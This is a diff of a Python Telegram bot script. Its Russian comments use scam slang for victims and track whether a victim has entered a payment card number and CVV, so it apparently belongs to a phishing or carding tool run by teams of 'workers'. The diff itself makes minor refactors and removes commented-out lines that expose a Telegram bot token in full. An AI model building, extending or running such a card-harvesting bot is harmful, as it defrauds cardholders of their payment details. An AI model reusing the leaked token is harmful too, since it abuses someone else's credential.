@@ -1,5 +1,4 @@
 import os
-import sys
 from time import sleep
 import colorama
 import telebot
@@ -19,11 +18,9 @@ workerid=[]
 worker=[]
 
 
-#bot = telebot.TeleBot('6440584401:AAFXeXLKH7V8hGr1PytNg9eHWWgaqvLDzKY')
 links = []
 Helper='none'
-#6440584401:AAFXeXLKH7V8hGr1PytNg9eHWWgaqvLDzKY
-
+datadir='./data/'
 #0 мамонт ничего не ввёл
 #1 мамонт ввёл карту
 #2 мамонт ввел cvv
@@ -63,7 +60,7 @@ def savedata():
 
 
 def loaddata():
-    files=os.listdir('./data/')
+    files=os.listdir(datadir)
     if len(files)==0:
         print('/// u dont have save file')
         print('/// first start. loading...')
@@ -103,9 +100,9 @@ def printlogo():
     logo=logo.readlines()
     for i in range(0,len(logo)):
         print(Back.BLACK+Fore.WHITE+str(logo[i])[:-1])
-        sleep(0.03)
+        sleep(0.1)
     logo=open('./name.txt','r')
     logo=logo.readlines()
     for i in range(0,len(logo)):
         print(Back.BLACK+Fore.WHITE+str(logo[i])[:-1])
-        sleep(0.03)
+        sleep(0.1)
